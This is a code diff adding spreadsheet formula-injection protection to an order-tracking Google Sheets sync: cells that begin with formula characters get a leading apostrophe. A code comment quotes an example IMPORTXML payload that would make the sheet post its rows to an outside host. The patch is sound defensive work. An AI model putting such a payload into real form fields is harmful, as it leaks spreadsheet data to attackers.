@@ -93,6 +93,32 @@ export function sgt(date = new Date()) {
 const money = (cents) => (Number(cents ?? 0) / 100).toFixed(2);
 
 /**
+ * Stop text a shopper wrote from being run as a spreadsheet formula.
+ *
+ * Cells go in as USER_ENTERED so prices and counts land as numbers a person
+ * can sum, rather than as strings. The same setting means a value opening with
+ * = + - @ is treated as a formula. Buyers choose their own name and note and
+ * nothing constrains the characters, so without this somebody could order
+ * under the name =IMPORTXML("https://.../"&A2,"//x") and have the committee's
+ * own spreadsheet post its rows to them the moment the tab was opened.
+ *
+ * A leading apostrophe tells Sheets to keep the rest as literal text. It is
+ * stored, not displayed, so the cell still reads the way it was typed.
+ *
+ * Numbers pass through untouched, which is what keeps the numeric columns
+ * numeric.
+ */
+function safeText(value) {
+  if (value === null || value === undefined) return '';
+  if (typeof value === 'number') return value;
+  const text = String(value);
+  return /^[=+\-@\t\r\n]/.test(text) ? `'${text}` : text;
+}
+
+/** Every cell of a row, guarded. */
+const safeRow = (cells) => cells.map(safeText);
+
+/**
  * Create any missing tab and write its header row. Runs once per process, and
  * is safe to run against a spreadsheet that already has the tabs.
  */
@@ -224,17 +250,17 @@ export async function recordOrder({ order, items, user }) {
         spreadsheetId: config.sheets.spreadsheetId,
         range: `${TABS.orders.title}!A${existingRow}:${columnLetter(orderRow.length - 1)}${existingRow}`,
         valueInputOption: 'USER_ENTERED',
-        requestBody: { values: [orderRow] },
+        requestBody: { values: [safeRow(orderRow)] },
       });
     } else {
-      await append(TABS.orders, [orderRow]);
+      await append(TABS.orders, [safeRow(orderRow)]);
       await append(
         TABS.orderItems,
-        items.map((i) => [
+        items.map((i) => safeRow([
           order.code, placedAt, order.buyer_name, i.category_name ?? '', i.sku, i.name,
           i.variant ?? '', money(i.unit_price_cents), i.quantity, money(i.line_total_cents),
           order.status,
-        ])
+        ]))
       );
     }
     return true;
@@ -255,7 +281,7 @@ export async function updateOrderStatus(order) {
       spreadsheetId: config.sheets.spreadsheetId,
       range: `${TABS.orders.title}!C${row}`,
       valueInputOption: 'RAW',
-      requestBody: { values: [[order.status]] },
+      requestBody: { values: [[safeText(order.status)]] },
     });
     return true;
   } catch (err) {
@@ -273,7 +299,7 @@ export async function syncCatalog(rows) {
 
     const values = rows.map((i) => {
       const available = Math.max((i.stock ?? 0) - (i.reserved ?? 0), 0);
-      return [
+      return safeRow([
         i.sku,
         i.category?.kind === 'drink' ? 'Drink' : 'Snack',
         i.category?.name ?? '',
@@ -290,7 +316,7 @@ export async function syncCatalog(rows) {
         i.is_active ? 'Yes' : 'No',
         i.is_special ? 'Yes' : '',
         sgt(i.updated_at),
-      ];
+      ]);
     });
 
     // Clear the data range first so deleted items do not linger as ghosts.
@@ -398,7 +424,7 @@ export async function readCatalogTab() {
 export async function recordStockMovement(movement) {
   if (!credentialsPresent()) return false;
   try {
-    await append(TABS.stock, [[
+    await append(TABS.stock, [safeRow([
       sgt(movement.created_at ?? new Date()),
       movement.sku ?? '',
       movement.item_name ?? '',
@@ -408,7 +434,7 @@ export async function recordStockMovement(movement) {
       movement.order_code ?? '',
       movement.actor_name ?? '',
       movement.note ?? '',
-    ]]);
+    ])]);
     return true;
   } catch (err) {
     log.error('Sheets recordStockMovement failed', { error: err.message });
